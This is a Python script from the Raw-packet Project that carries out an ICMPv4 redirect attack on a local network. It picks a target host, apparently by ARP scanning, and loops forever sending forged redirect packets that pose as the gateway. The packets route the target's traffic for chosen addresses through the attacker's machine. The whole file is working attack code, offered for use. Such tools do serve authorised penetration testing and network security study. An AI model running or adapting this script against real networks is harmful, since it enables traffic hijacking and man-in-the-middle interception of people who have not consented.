#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
icmpv4_redirect.py: ICMPv4 redirect script
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from sys import path
from os.path import dirname, abspath
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW
from time import sleep
from typing import Union, List
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
# endregion

# region Main function
if __name__ == '__main__':

    # region Import Raw-packet classes
    path.append(dirname(dirname(dirname(abspath(__file__)))))

    from raw_packet.Utils.base import Base
    from raw_packet.Utils.network import RawICMPv4
    from raw_packet.Scanners.arp_scanner import ArpScan
    from raw_packet.Scanners.scanner import Scanner

    base: Base = Base()
    icmpv4: RawICMPv4 = RawICMPv4()
    arp_scan: ArpScan = ArpScan()
    scanner: Scanner = Scanner()
    # endregion

    # region Raw socket
    raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
    # endregion

    try:
        # region Check user and platform
        base.check_user()
        base.check_platform()
        # endregion

        # region Parse script arguments
        parser: ArgumentParser = ArgumentParser(description='ICMPv4 redirect script')
        parser.add_argument('-i', '--interface', help='Set interface name for send ICMP redirect packets',
                            default=None, type=str)
        parser.add_argument('-t', '--target_ip', help='Set target IP address',
                            default=None, type=str)
        parser.add_argument('-m', '--target_mac', help='Set target MAC address',
                            default=None, type=str)
        parser.add_argument('-g', '--gateway_ip', help='Set gateway IP address (default: <your_ip_address>)',
                            default=None, type=str)
        parser.add_argument('-r', '--redirect_ip', help='Set IP addresses where to redirect (example: 8.8.8.8,1.1.1.1)',
                            default='8.8.8.8', type=str)
        parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
        args = parser.parse_args()
        # endregion

        # region Print banner if argument quit is not set
        if not args.quiet:
            base.print_banner()
        # endregion

        # region Get listen network interface, your IP and MAC address, first and last IP in local network
        if args.interface is None:
            base.print_warning('Please set a network interface for send ARP spoofing packets ...')
        current_network_interface: str = base.network_interface_selection(args.interface)
        your_mac_address: str = base.get_interface_mac_address(current_network_interface)
        your_ip_address: str = base.get_interface_ip_address(current_network_interface)
        your_network: str = base.get_interface_network(current_network_interface)
        # endregion

        # region Bind raw socket
        raw_socket.bind((current_network_interface, 0))
        # endregion

        # region Set gateway IP address
        gateway_ip_address: Union[None, str] = None

        if args.gateway_ip is not None:
            assert base.ip_address_in_network(args.gateway_ip, your_network), \
                'Gateway IP address: ' + base.error_text(args.gateway_ip) + \
                ' not in your network: ' + base.info_text(your_network)
            gateway_ip_address: str = str(args.gateway_ip)
        else:
            gateway_ip_address: str = base.get_interface_gateway(current_network_interface)
        # endregion

        # region Check target host IP and MAC address
        target_ip_address: Union[None, str] = None
        target_mac_address: Union[None, str] = None

        if args.target_ip is None:
            if not args.quiet:
                arp_scan_results = arp_scan.scan(network_interface=current_network_interface,
                                                 timeout=5, retry=5, show_scan_percentage=True,
                                                 exclude_ip_addresses=[gateway_ip_address])
            else:
                arp_scan_results = arp_scan.scan(network_interface=current_network_interface,
                                                 timeout=5, retry=5, show_scan_percentage=False,
                                                 exclude_ip_addresses=[gateway_ip_address])
            target = scanner.ipv4_device_selection(arp_scan_results)
            target_ip_address = target['ip-address']
            target_mac_address = target['mac-address']

        else:
            assert base.ip_address_in_network(args.target_ip, your_network), \
                'Target IP address: ' + base.error_text(args.target_ip) + \
                ' not in your network: ' + base.info_text(your_network)
            target_ip_address = str(args.target_ip)
            scan_target_mac_address: str = arp_scan.get_mac_address(network_interface=current_network_interface,
                                                                    target_ip_address=target_ip_address,
                                                                    show_scan_percentage=False)
            if args.target_mac is not None:
                assert base.mac_address_validation(args.target_mac), \
                    'Bad test host MAC address: ' + base.error_text(args.target_mac)
                assert args.target_mac == scan_target_mac_address, \
                    'Test host MAC address in argument: ' + base.error_text(args.target_mac) + \
                    ' is not real test host MAC address: ' + base.info_text(scan_target_mac_address)
            target_mac_address = scan_target_mac_address
        # endregion

        # region Redirected host IP address
        redirect_ip_addresses: List[str] = list()
        for redirect_ip_address in str(args.redirect_ip).replace(' ', '').split(','):
            assert base.ip_address_validation(redirect_ip_address), \
                'Invalid redirect IP address: ' + base.error_text(redirect_ip_address)
            redirect_ip_addresses.append(redirect_ip_address)
        # endregion

        # region General output
        if not args.quiet:
            base.print_info('Network interface: ', current_network_interface)
            base.print_info('Your IP address: ', your_ip_address)
            base.print_info('Your MAC address: ', your_mac_address)
            base.print_info('Gateway IP address: ', gateway_ip_address)
            base.print_info('Target IP address: ', target_ip_address)
            base.print_info('Target MAC address: ', target_mac_address)
            base.print_info('Redirect IP addresses: ', str(redirect_ip_addresses))
        # endregion

        # region Send ICMPv4 redirect packets
        icmpv4_packets: List[bytes] = list()
        for redirect_ip_address in redirect_ip_addresses:
            base.print_info('Send ICMPv4 redirect packets: ', target_ip_address, ' <-> ',
                            your_ip_address,  ' <-> ', redirect_ip_address)
            icmpv4_packets.append(icmpv4.make_redirect_packet(ethernet_src_mac=your_mac_address,
                                                              ethernet_dst_mac=target_mac_address,
                                                              ip_src=gateway_ip_address,
                                                              ip_dst=target_ip_address,
                                                              gateway_address=your_ip_address,
                                                              payload_ip_src=target_ip_address,
                                                              payload_ip_dst=redirect_ip_address))
        while True:
            for icmpv4_packet in icmpv4_packets:
                raw_socket.send(icmpv4_packet)
            sleep(0.5)
        # endregion

    except KeyboardInterrupt:
        raw_socket.close()
        base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        raw_socket.close()
        base.print_error(Error.args[0])
        exit(1)

# endregion
